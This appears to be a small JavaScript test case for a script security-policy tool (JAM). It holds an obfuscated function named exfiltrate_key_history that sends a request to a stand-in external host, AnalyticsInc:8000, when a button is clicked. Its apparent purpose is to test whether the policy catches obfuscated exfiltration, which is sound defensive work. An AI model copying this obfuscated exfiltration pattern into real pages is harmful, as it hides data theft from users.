// exfil_test_obfu.js
function exfiltrate_key_history() {
  var _0x2e14 = ["GET", "http://AnalyticsInc:8000/submission.html?", "test=java_obfuscator", "open", "send"];
  xmlhttp = new XMLHttpRequest;
  JAM.call(xmlhttp[_0x2e14[3]], xmlhttp, [_0x2e14[0], _0x2e14[1] + _0x2e14[2], true], JAM.policy.p1);
  JAM.call(xmlhttp[_0x2e14[4]], xmlhttp, [null]);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

